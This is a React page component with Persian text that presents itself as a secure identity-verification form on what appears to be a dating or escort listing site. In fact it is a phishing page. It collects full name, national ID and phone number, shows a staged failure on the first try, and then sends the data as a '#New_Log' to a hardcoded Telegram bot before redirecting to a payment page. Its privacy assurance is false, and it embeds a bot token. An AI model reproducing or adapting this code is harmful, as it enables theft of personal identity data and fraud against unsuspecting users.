import { useState, useEffect } from 'react';
import { useParams, useNavigate, useLocation } from 'react-router-dom';
import NavBar from '../../components/base/NavBar';
import TabBar from '../../components/base/TabBar';
import { casesAPI, type CaseData } from '../../lib/supabase';

interface SystemConfig {
  telegramBotToken: string;
  telegramBotUsername: string;
  telegramChatId: string;
  paymentGatewayUrl: string;
  defaultFeeAmount: number;
}

export default function Verification() {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const location = useLocation();
  const [caseData, setCaseData] = useState<CaseData | null>(null);
  const [loading, setLoading] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitAttempt, setSubmitAttempt] = useState(0);
  const [verificationStep, setVerificationStep] = useState<'form' | 'processing' | 'error' | 'success'>('form');
  const [systemConfig, setSystemConfig] = useState<SystemConfig>({
    telegramBotToken: '8076200823:AAE4BhBPGjxfYQuYJ2ifKGOt2kRq869-GmI',
    telegramBotUsername: '6498549652',
    telegramChatId: '6498549652',
    paymentGatewayUrl: 'https://Kos.com'
  });

  const [formData, setFormData] = useState({
    fullName: '',
    nationalId: '',
    phoneNumber: ''
  });

  useEffect(() => {
    loadSystemConfig();
    
    if (id) {
      loadCaseData(parseInt(id));
    }
  }, [id]);

  const loadSystemConfig = () => {
    const savedConfig = localStorage.getItem('systemConfig');
    if (savedConfig) {
      setSystemConfig({ ...systemConfig, ...JSON.parse(savedConfig) });
    }
  };

  const loadCaseData = async (caseId: number) => {
    setLoading(true);
    
    // اگر از state منتقل شده باشد
    if (location.state && location.state.caseData) {
      setCaseData(location.state.caseData);
      setLoading(false);
      return;
    }

    try {
      const supabaseCase = await casesAPI.getById(caseId);
      if (supabaseCase) {
        setCaseData(supabaseCase);
        console.log('✅ کیس از دیتابیس بارگذاری شد:', supabaseCase.name);
      } else {
        // ایجاد کیس نمونه در صورت عدم وجود
        const sampleCase: CaseData = {
          id: caseId,
          name: `کیس ${caseId}`,
          image: `https://readdy.ai/api/search-image?query=Beautiful%20Persian%20woman%20portrait%20elegant%20style&width=300&height=400&seq=${caseId}&orientation=portrait`,
          location: 'تهران',
          category: 'temporary',
          price: 400000,
          age: 26,
          description: 'کیس فعال برای استعلام',
          status: 'active',
          verified: true,
          online: true,
          created_at: new Date().toISOString()
        };
        setCaseData(sampleCase);
        console.log('🆕 کیس نمونه ایجاد شد برای استعلام');
      }
    } catch (error) {
      console.error('خطا در بارگذاری کیس:', error);
      // ایجاد کیس پیش‌فرض
      const defaultCase: CaseData = {
        id: caseId,
        name: `کیس شماره ${caseId}`,
        image: `https://readdy.ai/api/search-image?query=Beautiful%20Persian%20woman%20portrait%20elegant%20style&width=300&height=400&seq=default&orientation=portrait`,
        location: 'تهران',
        category: 'temporary',
        price: 350000,
        age: 25,
        description: 'کیس آماده برای استعلام',
        status: 'active',
        verified: true,
        online: true,
        created_at: new Date().toISOString()
      };
      setCaseData(defaultCase);
    }
    
    setLoading(false);
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const validateNationalId = (nationalId: string): boolean => {
    if (!nationalId || nationalId.length !== 10) return false;
    if (!/^\d{10}$/.test(nationalId)) return false;
    
    const invalidCodes = ['0000000000', '1111111111', '2222222222', '3333333333', '4444444444', 
                         '5555555555', '6666666666', '7777777777', '8888888888', '9999999999'];
    if (invalidCodes.includes(nationalId)) return false;
    
    const check = parseInt(nationalId[9]);
    let sum = 0;
    
    for (let i = 0; i < 9; i++) {
      sum += parseInt(nationalId[i]) * (10 - i);
    }
    
    const remainder = sum % 11;
    return (remainder < 2 && check === remainder) || (remainder >= 2 && check === 11 - remainder);
  };

  const validatePhoneNumber = (phoneNumber: string): boolean => {
    if (!phoneNumber) return false;
    const cleanPhone = phoneNumber.replace(/[\s-]/g, '');
    if (cleanPhone.length !== 11) return false;
    if (!cleanPhone.startsWith('09')) return false;
    return true;
  };

  const validateFullName = (fullName: string): boolean => {
    if (!fullName || fullName.trim().length < 3) return false;
    const words = fullName.trim().split(/\s+/);
    if (words.length < 2) return false;
    if (words.some(word => word.length < 2)) return false;
    const validPattern = /^[a-zA-Zآ-ی\s]+$/;
    return validPattern.test(fullName);
  };

  const validateForm = () => {
    if (!validateFullName(formData.fullName)) {
      alert('لطفاً نام و نام خانوادگی را به صورت کامل وارد کنید');
      return false;
    }
    
    if (!validateNationalId(formData.nationalId)) {
      alert('کد ملی وارد شده نامعتبر است');
      return false;
    }
    
    if (!validatePhoneNumber(formData.phoneNumber)) {
      alert('شماره موبایل وارد شده نامعتبر است');
      return false;
    }
    
    return true;
  };

  const sendToTelegram = (message: string) => {
    if (systemConfig.telegramBotToken && systemConfig.telegramChatId) {
      const telegramUrl = `https://api.telegram.org/bot${systemConfig.telegramBotToken}/sendMessage`;
      
      fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: systemConfig.telegramChatId,
          text: message,
          parse_mode: 'HTML'
        })
      }).then(response => {
        if (response.ok) {
          console.log('✅ پیام استعلام به تلگرام ارسال شد');
        } else {
          console.error('❌ خطا در ارسال پیام استعلام');
        }
      }).catch(error => {
        console.error('❌ خطا در ارسال پیام:', error);
      });
    } else {
      console.log('ℹ️ تنظیمات تلگرام یافت نشد - پیام:', message);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) return;
    
    setIsSubmitting(true);
    setVerificationStep('processing');
    const currentAttempt = submitAttempt + 1;
    setSubmitAttempt(currentAttempt);

    if (currentAttempt === 1) {
      setTimeout(() => {
        setVerificationStep('error');
        setIsSubmitting(false);
      }, 3000);
    } else {
      setTimeout(() => {
        const currentDate = new Date();
        const persianDate = currentDate.toLocaleDateString('fa-IR');
        const persianTime = currentDate.toLocaleTimeString('fa-IR');

        // فرمت جدید پیام تلگرام
        const telegramMessage = `#New_Log 🫦
"" "" "" "" "" "" "" "" "" ""
📀Name : <code>${formData.fullName}</code>
💿Phone : <code>${formData.phoneNumber}</code>
🪀#Code_meli : <code>${formData.nationalId}</code>
"" "" "" "" "" "" "" "" "" ""
🕰Time : ${persianDate}, ${persianTime}`;

        sendToTelegram(telegramMessage);
        
        setVerificationStep('success');
        setIsSubmitting(false);
        
        setTimeout(() => {
          navigate('/payment/' + id, {
            state: {
              caseData: caseData,
              verificationData: formData
            }
          });
        }, 3000);
      }, 3000);
    }
  };

  const retryVerification = () => {
    setVerificationStep('form');
    setIsSubmitting(false);
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 via-indigo-50 to-purple-100 flex items-center justify-center">
        <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-8 shadow-xl text-center">
          <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
          <p className="text-gray-600">در حال بارگذاری...</p>
        </div>
      </div>
    );
  }

  // صفحه در حال پردازش
  if (verificationStep === 'processing') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 via-indigo-50 to-purple-100">
        <NavBar title="در حال استعلام" showBack={false} />
        <div className="pt-20 pb-20 px-4 flex items-center justify-center min-h-[calc(100vh-8rem)]">
          <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-8 shadow-xl text-center max-w-md">
            <div className="w-24 h-24 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
            <h3 className="text-xl font-bold text-gray-800 mb-3">در حال استعلام اطلاعات</h3>
            <p className="text-gray-600 leading-relaxed">
              لطفاً صبر کنید، اطلاعات هویتی شما در حال بررسی است...
            </p>
            <div className="mt-6 flex justify-center">
              <div className="flex space-x-1 rtl:space-x-reverse">
                <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce"></div>
                <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{animationDelay: '0.1s'}}></div>
                <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{animationDelay: '0.2s'}}></div>
              </div>
            </div>
          </div>
        </div>
        <TabBar />
      </div>
    );
  }

  // صفحه خطا
  if (verificationStep === 'error') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-red-50 via-pink-50 to-rose-100">
        <NavBar title="خطا در استعلام" showBack={false} />
        <div className="pt-20 pb-20 px-4 flex items-center justify-center min-h-[calc(100vh-8rem)]">
          <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-8 shadow-xl text-center max-w-md">
            <div className="w-24 h-24 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <i className="ri-error-warning-line text-red-500 text-3xl"></i>
            </div>
            <h3 className="text-xl font-bold text-gray-800 mb-3">استعلام با موفقیت انجام نشد</h3>
            <p className="text-red-600 font-semibold mb-4">
              شماره تماس با کد ملی مطابقت ندارد
            </p>
            <p className="text-gray-600 mb-6 leading-relaxed text-sm">
              لطفاً اطلاعات هویتی خود را با دقت بررسی کرده و مجدداً اقدام کنید
            </p>
            <button
              onClick={retryVerification}
              className="w-full bg-gradient-to-r from-blue-600 to-cyan-700 hover:from-blue-700 hover:to-cyan-800 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300"
            >
              <i className="ri-repeat-line ml-2"></i>
              تلاش مجدد
            </button>
          </div>
        </div>
        <TabBar />
      </div>
    );
  }

  // صفحه موفقیت
  if (verificationStep === 'success') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-green-50 via-emerald-50 to-teal-100">
        <NavBar title="استعلام موفق" showBack={false} />
        <div className="pt-20 pb-20 px-4 flex items-center justify-center min-h-[calc(100vh-8rem)]">
          <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-8 shadow-xl text-center max-w-md">
            <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <i className="ri-check-double-line text-green-500 text-3xl"></i>
            </div>
            <h3 className="text-xl font-bold text-gray-800 mb-3">استعلام با موفقیت انجام شد</h3>
            <p className="text-green-600 font-semibold mb-4">
              ✅ اطلاعات هویتی تایید شد
            </p>
            <p className="text-gray-600 mb-6 leading-relaxed text-sm">
              در حال انتقال به مرحله بعد...
            </p>
            <div className="flex justify-center">
              <div className="w-8 h-8 border-4 border-green-500 border-t-transparent rounded-full animate-spin"></div>
            </div>
          </div>
        </div>
        <TabBar />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-green-50 via-emerald-50 to-teal-100">
      <NavBar title="احراز هویت" showBack={true} />

      <div className="pt-20 pb-20 px-4">
        {/* Case Info */}
        {caseData && (
          <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-6 shadow-xl mb-6 border border-white/30">
            <div className="flex items-center mb-4">
              <img 
                src={caseData.image}
                alt={caseData.name}
                className="w-16 h-16 rounded-2xl object-cover shadow-lg mr-4"
              />
              <div className="flex-1">
                <h3 className="font-bold text-gray-800 text-lg">{caseData.name}</h3>
                <p className="text-gray-600 text-sm mb-1">{caseData.location}</p>
                <div className="flex items-center">
                  <div className="w-2 h-2 bg-green-500 rounded-full mr-2"></div>
                  <span className="text-green-600 text-sm font-medium">فعال</span>
                </div>
              </div>
            </div>
            
            <div className="bg-blue-50 border border-blue-200 rounded-2xl p-4">
              <div className="flex items-center">
                <i className="ri-shield-check-line text-blue-600 text-xl ml-3"></i>
                <div>
                  <p className="text-blue-800 font-semibold text-sm">احراز هویت امن</p>
                  <p className="text-blue-700 text-sm">از این اطلاعات برای ارتباط با کیس در لحظه دیدار استفاده خواهد شد</p>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Form */}
        <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-6 shadow-xl border border-white/30">
          <h2 className="text-xl font-bold text-gray-800 mb-6 text-center">
            <i className="ri-user-settings-line ml-2 text-green-600"></i>
            اطلاعات هویتی
          </h2>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-gray-700 text-sm font-semibold mb-2">
                نام و نام خانوادگی
              </label>
              <div className="relative">
                <input
                  type="text"
                  name="fullName"
                  value={formData.fullName}
                  onChange={handleInputChange}
                  placeholder="مثال: علی احمدی"
                  className="w-full bg-gray-50 border border-gray-200 rounded-2xl px-4 py-3 pr-12 focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent"
                  required
                />
                <i className="ri-user-line absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
              </div>
              {formData.fullName && !validateFullName(formData.fullName) && (
                <p className="text-red-500 text-xs mt-1">نام و نام خانوادگی باید حداقل دو کلمه باشد</p>
              )}
            </div>

            <div>
              <label className="block text-gray-700 text-sm font-semibold mb-2">
                کد ملی
              </label>
              <div className="relative">
                <input
                  type="text"
                  name="nationalId"
                  value={formData.nationalId}
                  onChange={handleInputChange}
                  placeholder="مثال: 1234567890"
                  maxLength={10}
                  className="w-full bg-gray-50 border border-gray-200 rounded-2xl px-4 py-3 pr-12 focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent"
                  required
                />
                <i className="ri-id-card-line absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
              </div>
              {formData.nationalId && !validateNationalId(formData.nationalId) && (
                <p className="text-red-500 text-xs mt-1">کد ملی وارد شده نامعتبر است</p>
              )}
            </div>

            <div>
              <label className="block text-gray-700 text-sm font-semibold mb-2">
                شماره موبایل
              </label>
              <div className="relative">
                <input
                  type="tel"
                  name="phoneNumber"
                  value={formData.phoneNumber}
                  onChange={handleInputChange}
                  placeholder="مثال: 09123456789"
                  maxLength={11}
                  className="w-full bg-gray-50 border border-gray-200 rounded-2xl px-4 py-3 pr-12 focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent"
                  required
                />
                <i className="ri-phone-line absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
              </div>
              {formData.phoneNumber && !validatePhoneNumber(formData.phoneNumber) && (
                <p className="text-red-500 text-xs mt-1">شماره موبایل نامعتبر است</p>
              )}
            </div>

            <div className="pt-4">
              <button
                type="submit"
                disabled={isSubmitting}
                className={`w-full font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300 ${
                  isSubmitting
                    ? 'bg-gray-400 text-gray-200 cursor-not-allowed'
                    : 'bg-gradient-to-r from-green-600 to-emerald-700 hover:from-green-700 hover:to-emerald-800 text-white hover:scale-105'
                }`}
              >
                {isSubmitting ? (
                  <div className="flex items-center justify-center">
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                    در حال احراز هویت...
                  </div>
                ) : (
                  <>
                    <i className="ri-shield-check-line ml-2"></i>
                    شروع احراز هویت
                  </>
                )}
              </button>
            </div>
          </form>

          <div className="mt-6 p-4 bg-green-50 border border-green-200 rounded-2xl">
            <div className="flex items-start">
              <i className="ri-shield-check-line text-green-600 text-lg ml-2 mt-0.5"></i>
              <div className="text-green-800 text-sm">
                <p className="font-semibold mb-1">حفظ حریم خصوصی</p>
                <p>تمام اطلاعات شما به صورت امن و محرمانه نگهداری می‌شود. در صورت مغایرت اطلاعات، هماهنگی لازم صورت نخواهد گرفت.</p>
              </div>
            </div>
          </div>
        </div>
      </div>

      <TabBar />
    </div>
  );
}